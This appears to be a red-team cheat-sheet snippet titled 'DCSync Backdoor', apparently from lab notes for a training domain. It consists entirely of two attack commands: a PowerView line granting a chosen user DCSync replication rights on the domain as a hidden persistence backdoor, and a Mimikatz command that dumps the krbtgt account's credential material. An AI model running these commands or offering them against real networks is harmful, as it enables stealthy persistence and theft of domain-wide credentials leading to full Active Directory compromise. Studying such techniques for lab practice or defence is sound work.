### DCSync Backdoor

```
# On Domain admin privilege Console 
 PowerShell Add-DomainObjectAcl -TargetIdentity 'DC=cyberbotic,DC=io' -PrincipalIdentity 'r.meyer' -Rights DCSync 
 ```
 ```
 On Local Admin privilege Console
 lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
```
